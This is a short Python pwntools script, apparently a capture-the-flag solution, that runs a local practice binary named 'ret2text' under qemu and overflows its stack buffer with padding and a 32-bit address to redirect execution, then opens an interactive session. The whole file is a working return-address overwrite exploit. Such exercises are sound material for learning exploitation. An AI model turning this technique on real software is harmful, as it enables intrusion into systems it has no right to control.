from pwn import*
context(os='linux', arch='i386', log_level='debug')
sh=process(["qemu-i386","-L","/usr/i686-linux-gnu/","./ret2text"])
target=0x0804863a
bufaddr= 0xffffdebc
esp=0xffffdf2c
offset=esp-bufaddr
payload=flat(offset*b'A',p32(target))
sh.sendline(payload)
sh.interactive()    